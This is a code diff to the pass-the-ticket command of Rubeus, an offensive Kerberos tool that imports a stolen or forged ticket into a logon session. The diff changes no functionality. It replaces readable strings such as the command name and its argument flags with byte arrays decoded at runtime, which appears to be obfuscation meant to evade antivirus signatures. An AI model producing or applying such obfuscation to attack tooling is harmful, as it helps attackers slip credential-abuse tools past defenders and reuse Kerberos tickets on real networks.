@@ -1,28 +1,27 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Globalization;
 using System.IO;
 using Rubeus.lib.Interop;
-
 
 namespace Rubeus.Commands
 {
     public class Ptt : ICommand
     {
-        public static string CommandName => "ptt";
+        private static string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);
+        public static string CommandName => S(new byte[] { 112, 116, 116 });
 
         public void Execute(Dictionary<string, string> arguments)
         {
-            string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);
-
             Console.WriteLine(S(new byte[] { 13, 10, 91, 42, 93, 32, 65, 99, 116, 105, 111, 110, 58, 32, 73, 109, 112, 111, 114, 116, 32, 84, 105, 99, 107, 101, 116 }));
 
             LUID luid = new LUID();
 
-            if (arguments.ContainsKey("/luid"))
+            if (arguments.ContainsKey(S(new byte[] { 47, 108, 117, 105, 100 })))
             {
                 try
                 {
-                    luid = new LUID(arguments["/luid"]);
+                    luid = new LUID(arguments[S(new byte[] { 47, 108, 117, 105, 100 })]);
                 }
                 catch
                 {
@@ -31,9 +30,9 @@ namespace Rubeus.Commands
                 }
             }
 
-            if (arguments.ContainsKey("/ticket"))
+            if (arguments.ContainsKey(S(new byte[] { 47, 116, 105, 99, 107, 101, 116 })))
             {
-                string kirbi64 = arguments["/ticket"];
+                string kirbi64 = arguments[S(new byte[] { 47, 116, 105, 99, 107, 101, 116 })];
 
                 if (Helpers.IsBase64String(kirbi64))
                 {
